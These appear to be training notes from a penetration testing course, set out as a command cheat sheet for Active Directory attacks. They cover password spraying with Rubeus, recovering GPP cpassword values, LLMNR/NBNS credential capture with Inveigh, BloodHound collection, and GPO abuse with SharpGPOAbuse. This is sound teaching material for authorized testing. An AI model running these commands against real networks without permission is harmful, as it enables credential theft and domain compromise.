*Day 2 notes from Light Pentest LITE (Live Interactive Training Experience)  
More information at https://7minsec.com/services/training/#lplite*

# Cracking hashes: part 2
Cracking hashes - basic syntax

```
hashcat name-of-hash-file-to-crack.txt wordlist.txt
```

# Sniping cleartext creds from GPOs
Finding vulnerable GPOs with decryptable "cpassword" values:
```
findstr /S /I cpassword \\tangent.town\sysvol\tangent.town\policies\*.xml
```

Using *Get-GPPPassword.ps1* to find and decrypt the passwords:
```
Import-Module .\Get-GPPPassword.ps1 
Get-GPPPassword.ps1
```
# CrackMapExec prep
Getting registry "tweaked" to make CME more pretty:
```
reg.exe add HKCU\Console /f /v VirtualTerminalLevel /t reg_dword /d 1
``` 
# CrackMapExec: validating domain credentials
Basic CME syntax:
```
python cme smb IP.OF.A.DOMAINCONTROLLER -u USERNAME -p PASSWORD
```

# Password spraying with Rubeus
Basic spraying:
```
Rubeus.exe brute /password:PASSWORD-YOU-WANNA-SPRAY-WITH /outfile:output.txt
```
Example:
```
Rubeus.exe brute /password:Summer2021 /outfile:summer2021.txt
```

BRUTE-spraying a specific user with a list of passwords (careful!) and saving any valid creds to a file:
```
Rubeus.exe brute /user:USER-YOU-WANT-TO-SPRAY /password:TEXT-FILE-FULL-OF-PASSWORDS.txt /outfile:output.txt
```

# Capturing credentials with Inveigh
Run as an admin prompt:
```
Inveigh.exe -nbns y -llmnr y -mdns y
```

# BloodHound: setting up Neo4j
Run as an admin prompt:
```
neo4j console
```

# SharpHound: data collection
```
sharphound -c all -d tangent.town
```

# Exploiting Group Policy Objects
A sample using [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse):

```
SharpGPOAbuse.exe --addcomputertask --taskname "NAME OF YOUR TASK" --author "NAME OF AUTHOR" --command "YOUR COMMAND" --arguments "YOUR ARGUMENTS" --gponame "NAME OF THE VULNERABLE GPO" 
```
